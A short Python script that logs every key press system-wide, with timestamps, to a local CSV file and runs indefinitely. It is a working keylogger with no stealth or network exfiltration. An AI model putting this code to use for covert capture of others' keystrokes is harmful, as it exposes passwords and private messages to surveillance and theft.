import keyboard
import time
import datetime
import csv

# Define the output file name and header
output_file = "key_log.csv"
header = ["Timestamp", "Key"]

# Initialize the output file and write the header
with open(output_file, "w", newline="") as f:
    writer = csv.writer(f)
    writer.writerow(header)

# Define the function to handle key press events
def on_key_press(event):
    # Get the timestamp for the event
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")

    # Write the key and timestamp to the output file
    with open(output_file, "a", newline="") as f:
        writer = csv.writer(f)
        writer.writerow([timestamp, event.name])

# Set up the key event listener
keyboard.on_press(on_key_press)

# Keep the script running
while True:
    time.sleep(1)
